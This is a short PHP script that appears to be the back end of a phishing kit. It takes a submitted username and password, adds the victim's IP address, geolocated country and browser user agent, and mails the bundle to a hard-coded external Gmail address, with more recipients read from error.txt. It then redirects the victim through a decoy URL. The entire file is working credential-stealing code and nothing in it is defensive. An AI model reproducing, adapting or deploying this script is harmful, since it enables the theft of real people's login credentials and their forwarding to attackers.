<?php
$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$browser  =     $_SERVER['HTTP_USER_AGENT'];
$message  =     "=============+[ User Info ]+==============\n";
$message .=     "Username : ".$_POST['em']."\n";
$message .=     "Password : ".$_POST['qrt']."\n";
$message .=     "=============+[ Loc Info ]+===============\n";
$message .=     "IP: ".$ip."\n";
$message .=     "=======================================\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .=     "=======================================\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .=     "=======================================\n";
$message .= 	"User-Agent: ".$browser."\n";
$message .=     "=======================================\n";
$message .=     "Date  & Time Log  : ".$adddate."\n";
$message .=     "=======================================\n";
$username = $_POST['em']."\n";
$password = $_POST['qrt']."\n";
$sniper = 'M3n';
$who_be_the_boss = 'WEeTEe';
$subj = "$sniper Login $ip $adddate\n";
$from = "From: $who_be_the_boss <west>\n";
$email_list = file("error.txt");
$to = implode($email_list);
if(empty($username) || strlen($password) <= 3)  
{
header('Location: index.php?ern=pageadaclk?sa=L&ai=C6SORSHOOV9m9D6XG7Qbf777AD_bd9aoHhruf0rYCyuKNkG&ar='.$username);
}

else {
mail("faithprosper795@gmail.com",$subj,$message,$from,$sniper);
header('Location: on.php?ern=pageadaclk?sa=L&ai=C6SORSHOOV9m9D6XG7Qbf777AD_bd9aoHhruf0rYCyuKNkG&ar='.$username);
}
?>